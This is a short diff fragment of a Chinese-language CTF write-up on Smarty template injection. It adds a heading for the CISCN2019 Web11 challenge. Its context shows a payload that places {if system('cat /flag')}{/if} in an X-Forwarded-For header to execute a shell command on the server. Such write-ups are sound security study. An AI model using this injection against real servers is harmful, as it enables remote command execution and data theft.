@@ -258,3 +258,6 @@ payload:
 ```http
 X-Forwarded-For: {if system('cat /flag')}{/if}
 ```
+# [CISCN2019 华东南赛区]Web11
+既然学到了smarty模板注入，那就趁热打铁在练一下吧
+同样是php网站，可以获取我的ip
